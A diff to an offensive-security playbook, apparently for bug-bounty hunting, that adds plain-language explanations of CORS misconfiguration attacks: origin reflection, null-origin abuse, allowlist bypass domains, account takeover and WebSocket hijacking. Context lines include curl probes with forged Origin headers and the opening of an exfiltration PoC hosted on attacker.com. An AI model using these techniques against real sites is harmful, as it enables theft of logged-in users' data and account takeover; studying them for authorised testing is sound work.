@@ -20,6 +20,8 @@
 > 4. **`null` is a real origin.** Sandboxed iframes, `data:`/`file:` documents, and some redirects send `Origin: null`. If the server allows `Origin: null` with credentials, any attacker page can become `null` (sandboxed iframe) and steal data. Always test `Origin: null`.
 > 5. **Weak allowlist logic = bypass.** Most "secure" CORS is a regex/`startsWith`/`endsWith`/`contains` check. `target.com.evil.com`, `eviltarget.com`, `target.com%60.evil.com`, sub-domain takeover, and `null` are how you defeat it. (Part II.)
 >
+> **In plain words — the analogy (used throughout):** your browser is like a **librarian who holds the victim's private file** (their logged-in session cookies for `target.com`). When your page on `evil.com` asks *"read me target.com's private data about this user,"* the librarian normally **refuses** — that refusal is the Same-Origin Policy (SOP). **CORS is a note the server hands the librarian saying "it's fine to read my responses aloud to *these* websites."** A CORS *misconfiguration* is that note being written carelessly — "read to **whoever asks**" (origin reflection) or "read to anyone claiming to be **`null`**". Two things must both be true for it to pay: the note must name **your** site (or `null`), **and** it must say **"include the victim's login"** (`Access-Control-Allow-Credentials: true`) — otherwise the librarian reads a version with *no* login, which contains nothing private. The bug is never "the note mentions my origin" — it's **"from evil.com I read another logged-in user's secret."**
+>
 > **Where the money is (memorize this order):** ① **reflected Origin + `ACAC:true` on an endpoint returning API keys/session tokens/PII → cross-origin account takeover or full data theft (Critical/High)** → ② **`null` origin + credentials → same** → ③ **trusted-subdomain reflection where a subdomain has XSS/takeover → pivot to credentialed theft** → ④ **`ACAO:*` on sensitive but *non*-credentialed internal/API data** → ⑤ *then* reflection on public/unauthenticated responses as **Low/Info**, not headliners.
 
 ---
@@ -132,6 +134,8 @@ nuclei -l live.txt -tags cors -o cors.txt
 ## 2.1 The Same-Origin Policy (SOP), in one breath
 By default a page on `evil.com` **can send** a request to `api.target.com` (with the victim's cookies, if `credentials` are included) but **cannot read** the response — the browser blocks the read. CORS is the *opt-in* that lets a server say "this other origin **is** allowed to read my responses." A CORS **misconfiguration** is the server wrongly opting in `evil.com`.
 
+> *In plain words:* "origin" = the scheme + host + port of a page (`https://evil.com`). The Same-Origin Policy is the browser's core rule: a page from one origin may *send* requests anywhere, but may only *read the response* from its own origin. That "send but can't read" split is the key subtlety — it's why CSRF (which only needs to *send*) is a different bug from CORS (which is about *reading*). CORS is the sanctioned exception: a server can opt specific other origins into reading its responses. The vuln is when it opts in origins it shouldn't.
+
 ## 2.2 The headers that matter
 ```
 RESPONSE (server → browser, decides if evil.com may READ):
@@ -146,6 +150,9 @@ REQUEST (browser → server):
 ```
 
 ## 2.3 The only two combinations that pay
+
+> *In plain words:* two response headers decide everything. **ACAO** (`Access-Control-Allow-Origin`) = *which* site may read the response. **ACAC** (`Access-Control-Allow-Credentials: true`) = *may that read include the victim's login* (cookies). You need **both** pointed your way: ACAO naming your origin **and** ACAC true. Miss either and there's no theft — ACAO-your-origin but no ACAC means the browser reads a logged-*out* copy (no secrets); ACAC true but ACAO not your origin means you're not allowed to read at all. The famous wildcard `ACAO: *` is a trap: the browser flatly **refuses to pair `*` with credentials**, so a bare `*` can only read *public* data — usually Info, not the payday. The payday is origin *reflection* (server echoes your origin) **plus** ACAC true.
+
 ```
 VULNERABLE  → ACAO: https://evil.com   (reflected/attacker-controlled)  +  ACAC: true   → READ CREDENTIALED SECRETS  ⭐
 SOMETIMES   → ACAO: *                  (wildcard)  + NO credentials      → read only PUBLIC data (Info, unless data is sensitive & creds not needed)
@@ -227,6 +234,8 @@ Access-Control-Allow-Credentials: true             ← THE multiplier — combin
 
 Send a battery of `Origin` values and watch how ACAO responds — this reveals the server's decision model and therefore which bypass applies.
 
+> *In plain words:* you're **probing how the server decides who's on the guest list.** Send a handful of different `Origin` headers and note which ones come back reflected in ACAO. The *pattern* tells you the rule: if *every* origin you send is echoed, there's no real check (reflect-any — the jackpot); if only `null` comes back, it allows the null origin; if only `something.target.com` works, it trusts its own subdomains (you'll need to control one). Once you know the rule, §6–§9 tell you exactly how to satisfy it with an origin **you** control.
+
 ```
 Send these origins (one per request), record the ACAO returned:
   https://evil.com                  → reflected?            → REFLECT-ANY (§6)            ⭐ easiest, highest yield
@@ -272,6 +281,8 @@ Confirm it's *true reflection* (not a coincidence): try several distinct random 
 
 `null` is a legitimate origin the browser sends from: **sandboxed iframes**, `data:`/`file:` URLs, documents from a `redirect`, and some cross-origin POSTs. Many allowlists naively include `null` (for "local file testing"). If the server allows it **with credentials**, *any* attacker can forge `null`.
 
+> *In plain words:* `null` isn't "no origin" — it's a real value the browser puts in the `Origin` header for certain page types, most usefully a **sandboxed iframe** (an `<iframe sandbox>` without `allow-same-origin` reports its origin as `null`). Developers often add `null` to the allowlist thinking it's harmless ("that's just local file testing"), but here's the catch: **anyone can *become* `null` on demand** — you just host a page that runs your fetch inside a sandboxed iframe. So "allow `null` + credentials" is exploitable by *any* website, which makes it just as bad as reflect-any (arguably worse, because it looks safe).
+
 ```bash
 curl -s -D - -o /dev/null -H "Origin: null" https://api.target.com/api/me | grep -i 'access-control'
 # Vulnerable:
@@ -296,6 +307,8 @@ curl -s -D - -o /dev/null -H "Origin: null" https://api.target.com/api/me | grep
 # 8. Allowlist / Regex / Suffix-Prefix Bypasses
 
 When the server *validates* the origin against an allowlist, the validation is usually a flawed string check. Defeat the specific flaw. (Full set in `CORS_ARSENAL.md`.)
+
+> *In plain words:* most "secure" CORS checks are lazy string tests, and each lazy test has a matching trick. If it just checks the origin **contains** `target.com`, register `target.com.evil.com` (a subdomain of *your* domain — it contains the string but is yours). If it checks the origin **ends with** `target.com`, register `nottarget.com`. If it **starts with** `https://target.com`, use `https://target.com.evil.com`. If it uses a regex with an un-escaped dot (`target.com` where `.` matches any char), `targetXcom.evil.com` slips through. The move is always: figure out the sloppy rule (from §5), then buy/point a domain **you control** that technically satisfies it.
 
 ```
 Server logic (guessed from §5)            Bypass origin you register/use
@@ -345,6 +358,8 @@ A literal `*` **cannot** be combined with `ACAC: true` (browsers ignore/forbid t
 - it's an **internal** service where reaching it at all is the issue (SSRF/host context).
 
 ## 10.2 Pre-flight (`OPTIONS`) — simple vs preflighted, and what it actually gates
+> *In plain words:* a "preflight" is a permission-check request (`OPTIONS`) the browser fires *before* the real one — but only for requests it considers "non-simple." Why you care: for the classic theft (a credentialed `GET` that returns a JSON body), the request **is** simple, so **there's no preflight to worry about** — the browser just sends it and lets you read the body if ACAO/ACAC allow. You only need the preflight to *pass* when you're doing something fancier (a `PUT`/`DELETE`, sending JSON or a custom auth header, or reading a secret out of a *response header*). So don't over-complicate the common case: reflected origin + `ACAC:true` on a GET = done, no preflight gymnastics.
+
 The browser sends a **pre-flight `OPTIONS`** before a request only when it's **"non-simple."** Knowing the rule decides whether you even need the preflight to pass:
 ```
 SIMPLE request (NO preflight — the credentialed GET/POST just goes, and you read the body if ACAO/ACAC allow):
@@ -409,6 +424,8 @@ A modern, often-missed CORS-adjacent control. **Private Network Access** (Chrome
 
 This is the core exploit: your page on `attacker.com` makes the victim's browser fetch a credentialed response from the target and ships it to you.
 
+> *In plain words:* here's the whole attack in one breath. The victim is logged into `target.com` (so their browser holds valid cookies). You trick them into visiting your page (a link, an ad, a watering-hole). Your page's JavaScript runs `fetch('https://api.target.com/api/me', {credentials:'include'})` — the `credentials:'include'` tells the browser to attach the victim's cookies, so the server replies with the victim's *private* data. Normally SOP would stop your script from *reading* that reply — but the CORS misconfig told the browser it's fine, so your script reads it and forwards it to your server. No XSS on the target needed; the victim just had to open your page while logged in.
+
 ```html
 <!-- poc/exfil.html — hosted on attacker.com; victim must be logged into target.com -->
 <!DOCTYPE html><html><body>
@@ -438,6 +455,8 @@ The browser allowed `attacker.com` to **read** the credentialed response *only b
 # 12. Account Takeover via CORS
 
 The strongest outcome. If the secret you read cross-origin authenticates the user, you take over the account.
+
+> *In plain words:* reading *any* private data cross-origin is already a good bug — but it jumps to the top tier when the thing you read is something that **logs you in as them**. If `/api/me` hands back a session token, API key, or a password-reset link, you don't just *see* the victim's data — you *become* the victim (replay the token, and the server treats you as them). That's the difference between "High: data exposure" and "Critical: one page-visit = full account takeover." So after any successful read, always ask: *does this leaked value let me authenticate as the victim?*
 
 ```
 □ API key / session token in the response  → replay it (Authorization: Bearer <token> / set the cookie) → full ATO.
@@ -473,6 +492,8 @@ If the misconfig also allows credentialed `POST`/`PUT` reads of the response (pr
 
 ## 13.3 Cross-Site WebSocket Hijacking (CSWSH) — the CORS-adjacent class
 **WebSockets do NOT honor the Same-Origin Policy or CORS.** A `ws://`/`wss://` handshake is a normal HTTP `Upgrade` request that **carries the victim's cookies** and is **not** gated by ACAO. If the server authenticates the WS purely by cookie and **doesn't validate the `Origin` header on the handshake**, an attacker page can open a **cross-origin, fully-authenticated WebSocket** to the target → read everything the victim's socket receives and send messages as them.
+
+> *In plain words:* WebSockets (the live two-way connection behind chat/notifications, `wss://…`) have a nasty gap: **the browser does *not* apply CORS to them.** When your page opens `new WebSocket('wss://target.com/chat')`, the browser still attaches the victim's cookies, and there's no ACAO check to stop you *reading* the messages. The server's *only* defense is to check the `Origin` header on the connection handshake itself — and many apps that carefully locked down CORS forget to do this on their socket. If it doesn't check, you get a fully logged-in connection to the victim's chat/feed from your evil page. This is "CSWSH" — think of it as "CORS theft, but over a WebSocket the developer forgot to guard" (CWE-1385).
 ```html
 <!-- attacker page; victim is logged into target.com -->
 <script>
